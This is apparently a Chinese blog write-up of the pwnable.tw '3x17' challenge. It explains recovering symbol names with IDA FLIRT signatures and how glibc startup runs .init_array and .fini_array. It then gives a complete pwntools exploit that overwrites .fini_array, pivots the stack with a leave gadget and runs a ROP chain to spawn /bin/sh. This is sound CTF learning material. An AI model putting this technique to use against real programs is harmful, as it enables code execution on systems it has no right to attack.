---
layout: post
title: pwnable.tw 3x17
date: 2022-08-03 20:17:00
---

好难的一关，顺着这关学了好多东西……

## Part0 符号名呢

### 摸索

本题是一个strip后的静态链接文件……
当我打开IDA，我看不到任何一个函数名，只有一大堆地址迎接我。
于是我在libc里耗了一天，成果只是大致知道执行了哪些函数，并且给 `read`、`write` 等库函数标了名称。

然后我想了一个方法，我是不是可以根据函数的地址来看出这是哪一个libc版本，然后就可以给每个函数都标上名称了？然而不行。
静态链接不像动态链接，它只把用到了的函数链接进文件，因此库函数的地址和它在库中的位置毫无关系。

然后当天晚上做梦的时候，我梦到真的有这么一个库，我一把库拖进IDA PRO，软件自动给所有的函数都标上了名字。
醒来的时候我一想，会不会真有根据函数特征来识别函数名的功能？拿起枕边手机一查就查到了。（话说你不能早点查吗）

### 解决

参考[利用ida pro的flare功能识别静态链接函数签名_Anciety的博客](https://blog.csdn.net/qq_29343201/article/details/74656456)

IDA支持给特定库生成一个签名，然后用这个签名识别库函数的名称！
有人已经生成过很多签名了，可以直接去[push0ebp/sig-database: IDA FLIRT Signature Database (github.com)](https://github.com/push0ebp/sig-database)下载。

那么问题来了，下哪个libc版本呢？
pwnable.tw的官网首页说，题目都运行在ubuntu16.04或18.04上，所以我先去把这两个系统对应的libc都下了下来，发现只识别了五十几个库函数……
然后又下了一大堆libc版本，最后在19.04里找到的libc6_2.28成功匹配到了六百多个库函数。

于是我终于知道哪个是main函数了……然后发现离成功还尚早……

## Part1 分析（~~放弃~~）

本关开启了NX和Canary，没开PIE，那么应该是可以修改某些东西的。
main函数干了四件事：

1. write一个"addr:"
2. read一个0x18长度的字符串，并用一个库函数将其转换成数字（当成10进制数）。
3. write一个"data:"
4. read一个0x18长度的字符串，地址是刚刚输入的数。

然后就ret了。可以发现，我们没有任何泄露栈地址的方法，没办法进行简单的ret2xxx系列攻击。
（然后我就放弃了，这题大概又是超出我知识水平范围的，所以去网上找writeup：[和媳妇一起学Pwn 之 3x17 | Clang裁缝店](https://xuanxuanblingbling.github.io/ctf/pwn/2019/09/06/317/)看了）

## Part2 main函数的启动过程

参考教程：[linux编程之main()函数启动过程_gary_ygl的博客](https://blog.csdn.net/gary_ygl/article/details/8506007)

读了文章，学到很多姿势，尤其是对于C程序的抽象->具象：
从一开始的程序运行过程就是 `main` 开始到结束；
到后来知道从 `_start` 开始，它负责调用 `__libc_start_main()`，`__libc_start_main()` 再调用 `main()` 函数；
再到现在发现 `__libc_start_main()` 干了很多事情，包括在调用 `main()` 函数之前，调用 `__libc_csu_init()` 函数，并且用 `_cxa_atexit()` 函数设置程序退出前执行 `__libc_csu_fini()` 函数（具体来说 `exit()` 调用 `_run_exit_handlers()` ，并在其中按照倒序调用之前用 `_cxa_atexit()` 注册过的函数）。并且在调用 `main()` 之后，会调用 `exit()` 函数。

（其实还干了一些初始化以及善后工作，但是和链接比较相关，和本题不那么相关）

而逆向本题可以看到，`__libc_csu_init()` 主要做两件事：

1. 调用位于 `.init` 段中的 `_init_proc()`
2. 按顺序调用位于 `.init_array` 中的函数（这是一个函数指针数组）（数组大小固定，汇编中直接用立即数地址计算数组大小）

类似地，`__libc_csu_fini()` 也干两件事，但是和init是正好顺序相反的：

1. 按逆序调用位于 `.fini_array` 中的函数（这是一个函数指针数组）（数组大小固定，汇编中直接用立即数地址计算数组大小）
2. 调用位于 `.fini` 段中的 `term_proc()`

然后画个图表示一下我的理解：

![两个csu函数的调用顺序](/images/3x17_1.jpg)

而 `.init_array` 和 `.fini_array` 都是rw的，可写！
然后我决定在懂得了这些之后再自己尝试一下利用！

## Part3 Exploitation

通过覆写一次 `.fini_array`，可以达到如图的效果。

![fini&main循环](/images/3x17_2.jpg)

由于不存在wx的段，所以放弃shellcode，想想如何ROP。
光凭 `.fini_array` 这两个call是没有用的，必须想办法stack pivot一下。

刚开始的思路是利用

```asm
0x00418820: mov rax, qword [0x00000000004B7120] ; ret  ;
0x0044f62b: xchg eax, esp ; ret  ;
```

这两个gadget来把rsp弄到我想要的地方。但是我发现这做不到，原因是 `.fini_array` 只有两个元素，我不论怎么修改这个数组，都**只能实际调用一个gadget**。
原因如下：

![覆盖fini_array的两种情况](/images/3x17_3.jpg)

我们必须要用一个gadget完成stack pivot，这意味着要么有一个gadget同时涵盖了赋值+修改rsp的工作，要么利用寄存器或栈上已有的值。
GDB动态调试到这里，发现确实有几个寄存器存着RW的位置，其中就包括rbp。然后回忆一下：`leave = mov rsp, rbp; pop rbp;` ，用这个来stack pivot。

然后利用静态链接程序的丰富gadget库轻松写出了ROP chain，拿到了shell。

```python
from pwn import *
context.arch = 'amd64'
filename="./3x17"
# io = process(["strace", filename])
# io = process([filename])
io = remote("chall.pwnable.tw", 10105)

def write(addr, data):
    io.send(str(addr).encode('ascii'))
    print(io.recvS())
    io.send(data)
    print(io.recvrepeatS(0.5))

# addr
fini_array_addr = 0x4b40f0
new_stack_addr = fini_array_addr + 0x10
csu_fini_addr = 0x402960
main_addr = 0x401b6d
sh_str_addr = 0x4b40e0   # 随便取的

# ROP gadget
pop_rax = 0x0041e4af
pop_rdi = 0x00401696
pop_rdx_rsi = 0x0044a309
mov_rax_val = 0x0044f62b
leave = 0x00401c4b
syscall = 0x00471db5
return_ = 0x00401016    # just a normal ret，用来占位子

# ROP payload
payload1 = pack(pop_rax) + pack(59) + pack(pop_rdi)
payload2 = pack(sh_str_addr) + pack(pop_rdx_rsi) + pack(0)
payload3 = pack(0) + pack(syscall) + pack(0)

# pwn
write(fini_array_addr, pack(csu_fini_addr) + pack(main_addr))

write(sh_str_addr, b'/bin/sh\x00')
write(new_stack_addr, payload1)
write(new_stack_addr + 8*3, payload2)
write(new_stack_addr + 8*6, payload3)

write(fini_array_addr, pack(leave) + pack(return_) + pack(pop_rax))

io.interactive()
```

一个小技巧：
如果不间断地给程序数据，很可能send到同一个 `read()` 里。
面对这种情况，可以在两个 `send()` 中间 `recv()` 一下，又或者加上一个 `pause()` 手动停止，又或者加上一个 `sleep(0.15)` 来自动停止。
